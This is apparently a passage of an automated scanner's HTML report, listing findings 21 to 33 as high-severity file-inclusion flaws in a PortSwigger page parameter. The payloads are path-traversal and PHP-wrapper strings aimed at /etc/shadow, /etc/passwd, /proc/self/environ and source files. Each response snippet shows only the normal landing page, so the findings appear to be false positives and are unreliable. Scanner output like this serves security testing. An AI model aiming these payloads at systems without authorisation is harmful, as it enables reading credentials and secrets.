+    <meta content="width=device-width, initial-scale=1" name="viewport">
+    <title>Web Security Academy: Free Online Training from PortSwigger</title>
+    <meta name="description" content="The Web Security Academy is a free online training center for web application security, brought to you by PortSwigger. Create an account to get started.">
+    <!-- Twitter data -->
+
+
+
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:title" content="Web Security Academy: Free Online Training from PortSwigger">
+    <meta name="twitter:description" content="The Web Security Academy is a free online training center for web application security, brought to you by PortSwigger. Create an account to get started.">
+<meta name="twitter:image" content="https://portswigger.net/content/images/logos/academy-twittercard.png">
+    <meta name="twitter:site" content="@WebSecAcademy">
+
+<!-- Open Graph data -->
+<meta property="og:title" content="Web Security Academy: Free Online Training from PortSwigger"/>
+    <meta property="og:description" content="The Web Security Academy is a free online training center for web application security, brought to you by PortSwigger. Create an account to get started.">
+<meta property="og:url" content="https://portswigger.net"/>
+<meta property="og:image" content="https://portswigger.net/content/images/logos/academy-twittercard.png"/>
+<meta property="og:type" content="website"/>
+<link rel="canonical" href="https://portswigger.net/web-security"/>
+<link rel="icon" href="/content/images/logos/favicon.ico" type="image/x-icon"/>
+<link rel="apple-touch-icon" href="/content/images/logos/apple-touch-icon.png">
+    <link href="/content/pslandingpages.css" rel="stylesheet" type="text/css">
+    <link rel="preload" href="/content/fonts/ps-icons-small/ps-icons-small.woff?td2uot" as="font" crossorigin="anonymous">
+<link rel="preload" href="</pre>
+        <p><em>Detected at: 2025-09-14 21:41:57</em></p>
+    </div>
+
+    <div class="vulnerability high">
+        <h3>21. Local/Remote File Inclusion <span class="severity-high">(high)</span></h3>
+        <p><strong>URL:</strong> <a href="https://portswigger.net/web-security?page=%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd" target="_blank">https://portswigger.net/web-security?page=%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd</a></p>
+        <p><strong>Description:</strong> Possible LFI/RFI vulnerability detected - URL-encoded path traversal in parameter 'page'</p>
+        <p><strong>Payload:</strong> <code>%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd</code></p>
+        <p><strong>Response Snippet:</strong></p>
+        <pre><!DOCTYPE html>
+<html>
+<head>
+    <meta charset="utf-8">
+    <meta content="IE=edge" http-equiv="X-UA-Compatible">
+    <meta content="width=device-width, initial-scale=1" name="viewport">
+    <title>Web Security Academy: Free Online Training from PortSwigger</title>
+    <meta name="description" content="The Web Security Academy is a free online training center for web application security, brought to you by PortSwigger. Create an account to get started.">
+    <!-- Twitter data -->
+
+
+
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:title" content="Web Security Academy: Free Online Training from PortSwigger">
+    <meta name="twitter:description" content="The Web Security Academy is a free online training center for web application security, brought to you by PortSwigger. Create an account to get started.">
+<meta name="twitter:image" content="https://portswigger.net/content/images/logos/academy-twittercard.png">
+    <meta name="twitter:site" content="@WebSecAcademy">
+
+<!-- Open Graph data -->
+<meta property="og:title" content="Web Security Academy: Free Online Training from PortSwigger"/>
+    <meta property="og:description" content="The Web Security Academy is a free online training center for web application security, brought to you by PortSwigger. Create an account to get started.">
+<meta property="og:url" content="https://portswigger.net"/>
+<meta property="og:image" content="https://portswigger.net/content/images/logos/academy-twittercard.png"/>
+<meta property="og:type" content="website"/>
+<link rel="canonical" href="https://portswigger.net/web-security"/>
+<link rel="icon" href="/content/images/logos/favicon.ico" type="image/x-icon"/>
+<link rel="apple-touch-icon" href="/content/images/logos/apple-touch-icon.png">
+    <link href="/content/pslandingpages.css" rel="stylesheet" type="text/css">
+    <link rel="preload" href="/content/fonts/ps-icons-small/ps-icons-small.woff?td2uot" as="font" crossorigin="anonymous">
+<link rel="preload" href="</pre>
+        <p><em>Detected at: 2025-09-14 21:41:58</em></p>
+    </div>
+
+    <div class="vulnerability high">
+        <h3>22. Local/Remote File Inclusion <span class="severity-high">(high)</span></h3>
+        <p><strong>URL:</strong> <a href="https://portswigger.net/web-security?page=..%5C..%5C..%5C..%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Chosts" target="_blank">https://portswigger.net/web-security?page=..%5C..%5C..%5C..%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Chosts</a></p>
+        <p><strong>Description:</strong> Possible LFI/RFI vulnerability detected - Windows hosts file in parameter 'page'</p>
+        <p><strong>Payload:</strong> <code>..\..\..\..\Windows\System32\drivers\etc\hosts</code></p>
+        <p><strong>Response Snippet:</strong></p>
+        <pre><!DOCTYPE html>
+<html>
+<head>
+    <meta charset="utf-8">
+    <meta content="IE=edge" http-equiv="X-UA-Compatible">
+    <meta content="width=device-width, initial-scale=1" name="viewport">
+    <title>Web Security Academy: Free Online Training from PortSwigger</title>
+    <meta name="description" content="The Web Security Academy is a free online training center for web application security, brought to you by PortSwigger. Create an account to get started.">
+    <!-- Twitter data -->
+
+
+
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:title" content="Web Security Academy: Free Online Training from PortSwigger">
+    <meta name="twitter:description" content="The Web Security Academy is a free online training center for web application security, brought to you by PortSwigger. Create an account to get started.">
+<meta name="twitter:image" content="https://portswigger.net/content/images/logos/academy-twittercard.png">
+    <meta name="twitter:site" content="@WebSecAcademy">
+
+<!-- Open Graph data -->
+<meta property="og:title" content="Web Security Academy: Free Online Training from PortSwigger"/>
+    <meta property="og:description" content="The Web Security Academy is a free online training center for web application security, brought to you by PortSwigger. Create an account to get started.">
+<meta property="og:url" content="https://portswigger.net"/>
+<meta property="og:image" content="https://portswigger.net/content/images/logos/academy-twittercard.png"/>
+<meta property="og:type" content="website"/>
+<link rel="canonical" href="https://portswigger.net/web-security"/>
+<link rel="icon" href="/content/images/logos/favicon.ico" type="image/x-icon"/>
+<link rel="apple-touch-icon" href="/content/images/logos/apple-touch-icon.png">
+    <link href="/content/pslandingpages.css" rel="stylesheet" type="text/css">
+    <link rel="preload" href="/content/fonts/ps-icons-small/ps-icons-small.woff?td2uot" as="font" crossorigin="anonymous">
+<link rel="preload" href="</pre>
+        <p><em>Detected at: 2025-09-14 21:41:59</em></p>
+    </div>
+
+    <div class="vulnerability high">
+        <h3>23. Local/Remote File Inclusion <span class="severity-high">(high)</span></h3>
+        <p><strong>URL:</strong> <a href="https://portswigger.net/web-security?page=..%5C..%5C..%5C..%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Chosts" target="_blank">https://portswigger.net/web-security?page=..%5C..%5C..%5C..%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Chosts</a></p>
+        <p><strong>Description:</strong> Possible LFI/RFI vulnerability detected - Windows path traversal in parameter 'page'</p>
+        <p><strong>Payload:</strong> <code>..\..\..\..\Windows\System32\drivers\etc\hosts</code></p>
+        <p><strong>Response Snippet:</strong></p>
+        <pre><!DOCTYPE html>
+<html>
+<head>
+    <meta charset="utf-8">
+    <meta content="IE=edge" http-equiv="X-UA-Compatible">
+    <meta content="width=device-width, initial-scale=1" name="viewport">
+    <title>Web Security Academy: Free Online Training from PortSwigger</title>
+    <meta name="description" content="The Web Security Academy is a free online training center for web application security, brought to you by PortSwigger. Create an account to get started.">
+    <!-- Twitter data -->
+
+
+
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:title" content="Web Security Academy: Free Online Training from PortSwigger">
+    <meta name="twitter:description" content="The Web Security Academy is a free online training center for web application security, brought to you by PortSwigger. Create an account to get started.">
+<meta name="twitter:image" content="https://portswigger.net/content/images/logos/academy-twittercard.png">
+    <meta name="twitter:site" content="@WebSecAcademy">
+
+<!-- Open Graph data -->
+<meta property="og:title" content="Web Security Academy: Free Online Training from PortSwigger"/>
+    <meta property="og:description" content="The Web Security Academy is a free online training center for web application security, brought to you by PortSwigger. Create an account to get started.">
+<meta property="og:url" content="https://portswigger.net"/>
+<meta property="og:image" content="https://portswigger.net/content/images/logos/academy-twittercard.png"/>
+<meta property="og:type" content="website"/>
+<link rel="canonical" href="https://portswigger.net/web-security"/>
+<link rel="icon" href="/content/images/logos/favicon.ico" type="image/x-icon"/>
+<link rel="apple-touch-icon" href="/content/images/logos/apple-touch-icon.png">
+    <link href="/content/pslandingpages.css" rel="stylesheet" type="text/css">
+    <link rel="preload" href="/content/fonts/ps-icons-small/ps-icons-small.woff?td2uot" as="font" crossorigin="anonymous">
+<link rel="preload" href="</pre>
+        <p><em>Detected at: 2025-09-14 21:42:03</em></p>
+    </div>
+
+    <div class="vulnerability high">
+        <h3>24. Local/Remote File Inclusion <span class="severity-high">(high)</span></h3>
+        <p><strong>URL:</strong> <a href="https://portswigger.net/web-security?page=/etc/shadow" target="_blank">https://portswigger.net/web-security?page=/etc/shadow</a></p>
+        <p><strong>Description:</strong> Possible LFI/RFI vulnerability detected - UNIX shadow file in parameter 'page'</p>
+        <p><strong>Payload:</strong> <code>/etc/shadow</code></p>
+        <p><strong>Response Snippet:</strong></p>
+        <pre><!DOCTYPE html>
+<html>
+<head>
+    <meta charset="utf-8">
+    <meta content="IE=edge" http-equiv="X-UA-Compatible">
+    <meta content="width=device-width, initial-scale=1" name="viewport">
+    <title>Web Security Academy: Free Online Training from PortSwigger</title>
+    <meta name="description" content="The Web Security Academy is a free online training center for web application security, brought to you by PortSwigger. Create an account to get started.">
+    <!-- Twitter data -->
+
+
+
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:title" content="Web Security Academy: Free Online Training from PortSwigger">
+    <meta name="twitter:description" content="The Web Security Academy is a free online training center for web application security, brought to you by PortSwigger. Create an account to get started.">
+<meta name="twitter:image" content="https://portswigger.net/content/images/logos/academy-twittercard.png">
+    <meta name="twitter:site" content="@WebSecAcademy">
+
+<!-- Open Graph data -->
+<meta property="og:title" content="Web Security Academy: Free Online Training from PortSwigger"/>
+    <meta property="og:description" content="The Web Security Academy is a free online training center for web application security, brought to you by PortSwigger. Create an account to get started.">
+<meta property="og:url" content="https://portswigger.net"/>
+<meta property="og:image" content="https://portswigger.net/content/images/logos/academy-twittercard.png"/>
+<meta property="og:type" content="website"/>
+<link rel="canonical" href="https://portswigger.net/web-security"/>
+<link rel="icon" href="/content/images/logos/favicon.ico" type="image/x-icon"/>
+<link rel="apple-touch-icon" href="/content/images/logos/apple-touch-icon.png">
+    <link href="/content/pslandingpages.css" rel="stylesheet" type="text/css">
+    <link rel="preload" href="/content/fonts/ps-icons-small/ps-icons-small.woff?td2uot" as="font" crossorigin="anonymous">
+<link rel="preload" href="</pre>
+        <p><em>Detected at: 2025-09-14 21:42:05</em></p>
+    </div>
+
+    <div class="vulnerability high">
+        <h3>25. Local/Remote File Inclusion <span class="severity-high">(high)</span></h3>
+        <p><strong>URL:</strong> <a href="https://portswigger.net/web-security?page=/etc/hosts" target="_blank">https://portswigger.net/web-security?page=/etc/hosts</a></p>
+        <p><strong>Description:</strong> Possible LFI/RFI vulnerability detected - UNIX hosts file in parameter 'page'</p>
+        <p><strong>Payload:</strong> <code>/etc/hosts</code></p>
+        <p><strong>Response Snippet:</strong></p>
+        <pre><!DOCTYPE html>
+<html>
+<head>
+    <meta charset="utf-8">
+    <meta content="IE=edge" http-equiv="X-UA-Compatible">
+    <meta content="width=device-width, initial-scale=1" name="viewport">
+    <title>Web Security Academy: Free Online Training from PortSwigger</title>
+    <meta name="description" content="The Web Security Academy is a free online training center for web application security, brought to you by PortSwigger. Create an account to get started.">
+    <!-- Twitter data -->
+
+
+
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:title" content="Web Security Academy: Free Online Training from PortSwigger">
+    <meta name="twitter:description" content="The Web Security Academy is a free online training center for web application security, brought to you by PortSwigger. Create an account to get started.">
+<meta name="twitter:image" content="https://portswigger.net/content/images/logos/academy-twittercard.png">
+    <meta name="twitter:site" content="@WebSecAcademy">
+
+<!-- Open Graph data -->
+<meta property="og:title" content="Web Security Academy: Free Online Training from PortSwigger"/>
+    <meta property="og:description" content="The Web Security Academy is a free online training center for web application security, brought to you by PortSwigger. Create an account to get started.">
+<meta property="og:url" content="https://portswigger.net"/>
+<meta property="og:image" content="https://portswigger.net/content/images/logos/academy-twittercard.png"/>
+<meta property="og:type" content="website"/>
+<link rel="canonical" href="https://portswigger.net/web-security"/>
+<link rel="icon" href="/content/images/logos/favicon.ico" type="image/x-icon"/>
+<link rel="apple-touch-icon" href="/content/images/logos/apple-touch-icon.png">
+    <link href="/content/pslandingpages.css" rel="stylesheet" type="text/css">
+    <link rel="preload" href="/content/fonts/ps-icons-small/ps-icons-small.woff?td2uot" as="font" crossorigin="anonymous">
+<link rel="preload" href="</pre>
+        <p><em>Detected at: 2025-09-14 21:42:06</em></p>
+    </div>
+
+    <div class="vulnerability high">
+        <h3>26. Local/Remote File Inclusion <span class="severity-high">(high)</span></h3>
+        <p><strong>URL:</strong> <a href="https://portswigger.net/web-security?page=/etc/group" target="_blank">https://portswigger.net/web-security?page=/etc/group</a></p>
+        <p><strong>Description:</strong> Possible LFI/RFI vulnerability detected - UNIX group file in parameter 'page'</p>
+        <p><strong>Payload:</strong> <code>/etc/group</code></p>
+        <p><strong>Response Snippet:</strong></p>
+        <pre><!DOCTYPE html>
+<html>
+<head>
+    <meta charset="utf-8">
+    <meta content="IE=edge" http-equiv="X-UA-Compatible">
+    <meta content="width=device-width, initial-scale=1" name="viewport">
+    <title>Web Security Academy: Free Online Training from PortSwigger</title>
+    <meta name="description" content="The Web Security Academy is a free online training center for web application security, brought to you by PortSwigger. Create an account to get started.">
+    <!-- Twitter data -->
+
+
+
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:title" content="Web Security Academy: Free Online Training from PortSwigger">
+    <meta name="twitter:description" content="The Web Security Academy is a free online training center for web application security, brought to you by PortSwigger. Create an account to get started.">
+<meta name="twitter:image" content="https://portswigger.net/content/images/logos/academy-twittercard.png">
+    <meta name="twitter:site" content="@WebSecAcademy">
+
+<!-- Open Graph data -->
+<meta property="og:title" content="Web Security Academy: Free Online Training from PortSwigger"/>
+    <meta property="og:description" content="The Web Security Academy is a free online training center for web application security, brought to you by PortSwigger. Create an account to get started.">
+<meta property="og:url" content="https://portswigger.net"/>
+<meta property="og:image" content="https://portswigger.net/content/images/logos/academy-twittercard.png"/>
+<meta property="og:type" content="website"/>
+<link rel="canonical" href="https://portswigger.net/web-security"/>
+<link rel="icon" href="/content/images/logos/favicon.ico" type="image/x-icon"/>
+<link rel="apple-touch-icon" href="/content/images/logos/apple-touch-icon.png">
+    <link href="/content/pslandingpages.css" rel="stylesheet" type="text/css">
+    <link rel="preload" href="/content/fonts/ps-icons-small/ps-icons-small.woff?td2uot" as="font" crossorigin="anonymous">
+<link rel="preload" href="</pre>
+        <p><em>Detected at: 2025-09-14 21:42:07</em></p>
+    </div>
+
+    <div class="vulnerability high">
+        <h3>27. Local/Remote File Inclusion <span class="severity-high">(high)</span></h3>
+        <p><strong>URL:</strong> <a href="https://portswigger.net/web-security?page=/etc/issue" target="_blank">https://portswigger.net/web-security?page=/etc/issue</a></p>
+        <p><strong>Description:</strong> Possible LFI/RFI vulnerability detected - UNIX issue file in parameter 'page'</p>
+        <p><strong>Payload:</strong> <code>/etc/issue</code></p>
+        <p><strong>Response Snippet:</strong></p>
+        <pre><!DOCTYPE html>
+<html>
+<head>
+    <meta charset="utf-8">
+    <meta content="IE=edge" http-equiv="X-UA-Compatible">
+    <meta content="width=device-width, initial-scale=1" name="viewport">
+    <title>Web Security Academy: Free Online Training from PortSwigger</title>
+    <meta name="description" content="The Web Security Academy is a free online training center for web application security, brought to you by PortSwigger. Create an account to get started.">
+    <!-- Twitter data -->
+
+
+
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:title" content="Web Security Academy: Free Online Training from PortSwigger">
+    <meta name="twitter:description" content="The Web Security Academy is a free online training center for web application security, brought to you by PortSwigger. Create an account to get started.">
+<meta name="twitter:image" content="https://portswigger.net/content/images/logos/academy-twittercard.png">
+    <meta name="twitter:site" content="@WebSecAcademy">
+
+<!-- Open Graph data -->
+<meta property="og:title" content="Web Security Academy: Free Online Training from PortSwigger"/>
+    <meta property="og:description" content="The Web Security Academy is a free online training center for web application security, brought to you by PortSwigger. Create an account to get started.">
+<meta property="og:url" content="https://portswigger.net"/>
+<meta property="og:image" content="https://portswigger.net/content/images/logos/academy-twittercard.png"/>
+<meta property="og:type" content="website"/>
+<link rel="canonical" href="https://portswigger.net/web-security"/>
+<link rel="icon" href="/content/images/logos/favicon.ico" type="image/x-icon"/>
+<link rel="apple-touch-icon" href="/content/images/logos/apple-touch-icon.png">
+    <link href="/content/pslandingpages.css" rel="stylesheet" type="text/css">
+    <link rel="preload" href="/content/fonts/ps-icons-small/ps-icons-small.woff?td2uot" as="font" crossorigin="anonymous">
+<link rel="preload" href="</pre>
+        <p><em>Detected at: 2025-09-14 21:42:09</em></p>
+    </div>
+
+    <div class="vulnerability high">
+        <h3>28. Local/Remote File Inclusion <span class="severity-high">(high)</span></h3>
+        <p><strong>URL:</strong> <a href="https://portswigger.net/web-security?page=/proc/self/environ" target="_blank">https://portswigger.net/web-security?page=/proc/self/environ</a></p>
+        <p><strong>Description:</strong> Possible LFI/RFI vulnerability detected - Process environment variables in parameter 'page'</p>
+        <p><strong>Payload:</strong> <code>/proc/self/environ</code></p>
+        <p><strong>Response Snippet:</strong></p>
+        <pre><!DOCTYPE html>
+<html>
+<head>
+    <meta charset="utf-8">
+    <meta content="IE=edge" http-equiv="X-UA-Compatible">
+    <meta content="width=device-width, initial-scale=1" name="viewport">
+    <title>Web Security Academy: Free Online Training from PortSwigger</title>
+    <meta name="description" content="The Web Security Academy is a free online training center for web application security, brought to you by PortSwigger. Create an account to get started.">
+    <!-- Twitter data -->
+
+
+
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:title" content="Web Security Academy: Free Online Training from PortSwigger">
+    <meta name="twitter:description" content="The Web Security Academy is a free online training center for web application security, brought to you by PortSwigger. Create an account to get started.">
+<meta name="twitter:image" content="https://portswigger.net/content/images/logos/academy-twittercard.png">
+    <meta name="twitter:site" content="@WebSecAcademy">
+
+<!-- Open Graph data -->
+<meta property="og:title" content="Web Security Academy: Free Online Training from PortSwigger"/>
+    <meta property="og:description" content="The Web Security Academy is a free online training center for web application security, brought to you by PortSwigger. Create an account to get started.">
+<meta property="og:url" content="https://portswigger.net"/>
+<meta property="og:image" content="https://portswigger.net/content/images/logos/academy-twittercard.png"/>
+<meta property="og:type" content="website"/>
+<link rel="canonical" href="https://portswigger.net/web-security"/>
+<link rel="icon" href="/content/images/logos/favicon.ico" type="image/x-icon"/>
+<link rel="apple-touch-icon" href="/content/images/logos/apple-touch-icon.png">
+    <link href="/content/pslandingpages.css" rel="stylesheet" type="text/css">
+    <link rel="preload" href="/content/fonts/ps-icons-small/ps-icons-small.woff?td2uot" as="font" crossorigin="anonymous">
+<link rel="preload" href="</pre>
+        <p><em>Detected at: 2025-09-14 21:42:10</em></p>
+    </div>
+
+    <div class="vulnerability high">
+        <h3>29. Local/Remote File Inclusion <span class="severity-high">(high)</span></h3>
+        <p><strong>URL:</strong> <a href="https://portswigger.net/web-security?page=/proc/self/cmdline" target="_blank">https://portswigger.net/web-security?page=/proc/self/cmdline</a></p>
+        <p><strong>Description:</strong> Possible LFI/RFI vulnerability detected - Process command line in parameter 'page'</p>
+        <p><strong>Payload:</strong> <code>/proc/self/cmdline</code></p>
+        <p><strong>Response Snippet:</strong></p>
+        <pre><!DOCTYPE html>
+<html>
+<head>
+    <meta charset="utf-8">
+    <meta content="IE=edge" http-equiv="X-UA-Compatible">
+    <meta content="width=device-width, initial-scale=1" name="viewport">
+    <title>Web Security Academy: Free Online Training from PortSwigger</title>
+    <meta name="description" content="The Web Security Academy is a free online training center for web application security, brought to you by PortSwigger. Create an account to get started.">
+    <!-- Twitter data -->
+
+
+
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:title" content="Web Security Academy: Free Online Training from PortSwigger">
+    <meta name="twitter:description" content="The Web Security Academy is a free online training center for web application security, brought to you by PortSwigger. Create an account to get started.">
+<meta name="twitter:image" content="https://portswigger.net/content/images/logos/academy-twittercard.png">
+    <meta name="twitter:site" content="@WebSecAcademy">
+
+<!-- Open Graph data -->
+<meta property="og:title" content="Web Security Academy: Free Online Training from PortSwigger"/>
+    <meta property="og:description" content="The Web Security Academy is a free online training center for web application security, brought to you by PortSwigger. Create an account to get started.">
+<meta property="og:url" content="https://portswigger.net"/>
+<meta property="og:image" content="https://portswigger.net/content/images/logos/academy-twittercard.png"/>
+<meta property="og:type" content="website"/>
+<link rel="canonical" href="https://portswigger.net/web-security"/>
+<link rel="icon" href="/content/images/logos/favicon.ico" type="image/x-icon"/>
+<link rel="apple-touch-icon" href="/content/images/logos/apple-touch-icon.png">
+    <link href="/content/pslandingpages.css" rel="stylesheet" type="text/css">
+    <link rel="preload" href="/content/fonts/ps-icons-small/ps-icons-small.woff?td2uot" as="font" crossorigin="anonymous">
+<link rel="preload" href="</pre>
+        <p><em>Detected at: 2025-09-14 21:42:13</em></p>
+    </div>
+
+    <div class="vulnerability high">
+        <h3>30. Local/Remote File Inclusion <span class="severity-high">(high)</span></h3>
+        <p><strong>URL:</strong> <a href="https://portswigger.net/web-security?page=/etc/passwd%5C0" target="_blank">https://portswigger.net/web-security?page=/etc/passwd%5C0</a></p>
+        <p><strong>Description:</strong> Possible LFI/RFI vulnerability detected - PHP null byte injection in parameter 'page'</p>
+        <p><strong>Payload:</strong> <code>/etc/passwd\0</code></p>
+        <p><strong>Response Snippet:</strong></p>
+        <pre><!DOCTYPE html>
+<html>
+<head>
+    <meta charset="utf-8">
+    <meta content="IE=edge" http-equiv="X-UA-Compatible">
+    <meta content="width=device-width, initial-scale=1" name="viewport">
+    <title>Web Security Academy: Free Online Training from PortSwigger</title>
+    <meta name="description" content="The Web Security Academy is a free online training center for web application security, brought to you by PortSwigger. Create an account to get started.">
+    <!-- Twitter data -->
+
+
+
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:title" content="Web Security Academy: Free Online Training from PortSwigger">
+    <meta name="twitter:description" content="The Web Security Academy is a free online training center for web application security, brought to you by PortSwigger. Create an account to get started.">
+<meta name="twitter:image" content="https://portswigger.net/content/images/logos/academy-twittercard.png">
+    <meta name="twitter:site" content="@WebSecAcademy">
+
+<!-- Open Graph data -->
+<meta property="og:title" content="Web Security Academy: Free Online Training from PortSwigger"/>
+    <meta property="og:description" content="The Web Security Academy is a free online training center for web application security, brought to you by PortSwigger. Create an account to get started.">
+<meta property="og:url" content="https://portswigger.net"/>
+<meta property="og:image" content="https://portswigger.net/content/images/logos/academy-twittercard.png"/>
+<meta property="og:type" content="website"/>
+<link rel="canonical" href="https://portswigger.net/web-security"/>
+<link rel="icon" href="/content/images/logos/favicon.ico" type="image/x-icon"/>
+<link rel="apple-touch-icon" href="/content/images/logos/apple-touch-icon.png">
+    <link href="/content/pslandingpages.css" rel="stylesheet" type="text/css">
+    <link rel="preload" href="/content/fonts/ps-icons-small/ps-icons-small.woff?td2uot" as="font" crossorigin="anonymous">
+<link rel="preload" href="</pre>
+        <p><em>Detected at: 2025-09-14 21:42:14</em></p>
+    </div>
+
+    <div class="vulnerability high">
+        <h3>31. Local/Remote File Inclusion <span class="severity-high">(high)</span></h3>
+        <p><strong>URL:</strong> <a href="https://portswigger.net/web-security?page=php%3A//filter/convert.base64-encode/resource%3Dindex.php" target="_blank">https://portswigger.net/web-security?page=php%3A//filter/convert.base64-encode/resource%3Dindex.php</a></p>
+        <p><strong>Description:</strong> Possible LFI/RFI vulnerability detected - PHP filter wrapper in parameter 'page'</p>
+        <p><strong>Payload:</strong> <code>php://filter/convert.base64-encode/resource=index.php</code></p>
+        <p><strong>Response Snippet:</strong></p>
+        <pre><!DOCTYPE html>
+<html>
+<head>
+    <meta charset="utf-8">
+    <meta content="IE=edge" http-equiv="X-UA-Compatible">
+    <meta content="width=device-width, initial-scale=1" name="viewport">
+    <title>Web Security Academy: Free Online Training from PortSwigger</title>
+    <meta name="description" content="The Web Security Academy is a free online training center for web application security, brought to you by PortSwigger. Create an account to get started.">
+    <!-- Twitter data -->
+
+
+
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:title" content="Web Security Academy: Free Online Training from PortSwigger">
+    <meta name="twitter:description" content="The Web Security Academy is a free online training center for web application security, brought to you by PortSwigger. Create an account to get started.">
+<meta name="twitter:image" content="https://portswigger.net/content/images/logos/academy-twittercard.png">
+    <meta name="twitter:site" content="@WebSecAcademy">
+
+<!-- Open Graph data -->
+<meta property="og:title" content="Web Security Academy: Free Online Training from PortSwigger"/>
+    <meta property="og:description" content="The Web Security Academy is a free online training center for web application security, brought to you by PortSwigger. Create an account to get started.">
+<meta property="og:url" content="https://portswigger.net"/>
+<meta property="og:image" content="https://portswigger.net/content/images/logos/academy-twittercard.png"/>
+<meta property="og:type" content="website"/>
+<link rel="canonical" href="https://portswigger.net/web-security"/>
+<link rel="icon" href="/content/images/logos/favicon.ico" type="image/x-icon"/>
+<link rel="apple-touch-icon" href="/content/images/logos/apple-touch-icon.png">
+    <link href="/content/pslandingpages.css" rel="stylesheet" type="text/css">
+    <link rel="preload" href="/content/fonts/ps-icons-small/ps-icons-small.woff?td2uot" as="font" crossorigin="anonymous">
+<link rel="preload" href="</pre>
+        <p><em>Detected at: 2025-09-14 21:42:15</em></p>
+    </div>
+
+    <div class="vulnerability high">
+        <h3>32. Local/Remote File Inclusion <span class="severity-high">(high)</span></h3>
+        <p><strong>URL:</strong> <a href="https://portswigger.net/web-security?page=php%3A//filter/read%3Dconvert.base64-encode/resource%3Dindex.php" target="_blank">https://portswigger.net/web-security?page=php%3A//filter/read%3Dconvert.base64-encode/resource%3Dindex.php</a></p>
+        <p><strong>Description:</strong> Possible LFI/RFI vulnerability detected - PHP filter read in parameter 'page'</p>
+        <p><strong>Payload:</strong> <code>php://filter/read=convert.base64-encode/resource=index.php</code></p>
+        <p><strong>Response Snippet:</strong></p>
+        <pre><!DOCTYPE html>
+<html>
+<head>
+    <meta charset="utf-8">
+    <meta content="IE=edge" http-equiv="X-UA-Compatible">
+    <meta content="width=device-width, initial-scale=1" name="viewport">
+    <title>Web Security Academy: Free Online Training from PortSwigger</title>
+    <meta name="description" content="The Web Security Academy is a free online training center for web application security, brought to you by PortSwigger. Create an account to get started.">
+    <!-- Twitter data -->
+
+
+
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:title" content="Web Security Academy: Free Online Training from PortSwigger">
+    <meta name="twitter:description" content="The Web Security Academy is a free online training center for web application security, brought to you by PortSwigger. Create an account to get started.">
+<meta name="twitter:image" content="https://portswigger.net/content/images/logos/academy-twittercard.png">
+    <meta name="twitter:site" content="@WebSecAcademy">
+
+<!-- Open Graph data -->
+<meta property="og:title" content="Web Security Academy: Free Online Training from PortSwigger"/>
+    <meta property="og:description" content="The Web Security Academy is a free online training center for web application security, brought to you by PortSwigger. Create an account to get started.">
+<meta property="og:url" content="https://portswigger.net"/>
+<meta property="og:image" content="https://portswigger.net/content/images/logos/academy-twittercard.png"/>
+<meta property="og:type" content="website"/>
+<link rel="canonical" href="https://portswigger.net/web-security"/>
+<link rel="icon" href="/content/images/logos/favicon.ico" type="image/x-icon"/>
+<link rel="apple-touch-icon" href="/content/images/logos/apple-touch-icon.png">
+    <link href="/content/pslandingpages.css" rel="stylesheet" type="text/css">
+    <link rel="preload" href="/content/fonts/ps-icons-small/ps-icons-small.woff?td2uot" as="font" crossorigin="anonymous">
+<link rel="preload" href="</pre>
+        <p><em>Detected at: 2025-09-14 21:42:16</em></p>
+    </div>
+
+    <div class="vulnerability high">
+        <h3>33. Local/Remote File Inclusion <span class="severity-high">(high)</span></h3>
+        <p><strong>URL:</strong> <a href="https://portswigger.net/web-security?page=data%3A//text/plain%3Bbase64%2CSSBsb3ZlIFBIUAo%3D" target="_blank">https://portswigger.net/web-security?page=data%3A//text/plain%3Bbase64%2CSSBsb3ZlIFBIUAo%3D</a></p>
+        <p><strong>Description:</strong> Possible LFI/RFI vulnerability detected - PHP data wrapper in parameter 'page'</p>
+        <p><strong>Payload:</strong> <code>data://text/plain;base64,SSBsb3ZlIFBIUAo=</code></p>
+        <p><strong>Response Snippet:</strong></p>
+        <pre><!DOCTYPE html>
+<html>
+<head>
+    <meta charset="utf-8">
+    <meta content="IE=edge" http-equiv="X-UA-Compatible">
+    <meta content="width=device-width, initial-scale=1" name="viewport">
+    <title>Web Security Academy: Free Online Training from PortSwigger</title>
+    <meta name="description" content="The Web Security Academy is a free online training center for web application security, brought to you by PortSwigger. Create an account to get started.">
+    <!-- Twitter data -->
+
+
+
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:title" content="Web Security Academy: Free Online Training from PortSwigger">
+    <meta name="twitter:description" content="The Web Security Academy is a free online training center for web application security, brought to you by PortSwigger. Create an account to get started.">
+<meta name="twitter:image" content="https://portswigger.net/content/images/logos/academy-twittercard.png">
+    <meta name="twitter:site" content="@WebSecAcademy">
+
+<!-- Open Graph data -->
+<meta property="og:title" content="Web Security Academy: Free Online Training from PortSwigger"/>
+    <meta property="og:description" content="The Web Security Academy is a free online training center for web application security, brought to you by PortSwigger. Create an account to get started.">
+<meta property="og:url" content="https://portswigger.net"/>
+<meta property="og:image" content="https://portswigger.net/content/images/logos/academy-twittercard.png"/>
+<meta property="og:type" content="website"/>
+<link rel="canonical" href="https://portswigger.net/web-security"/>
+<link rel="icon" href="/content/images/logos/favicon.ico" type="image/x-icon"/>
+<link rel="apple-touch-icon" href="/content/images/logos/apple-touch-icon.png">
+    <link href="/content/pslandingpages.css" rel="stylesheet" type="text/css">
+    <link rel="preload" href="/content/fonts/ps-icons-small/ps-icons-small.woff?td2uot" as="font" crossorigin="anonymous">
+<link rel="preload" href="</pre>
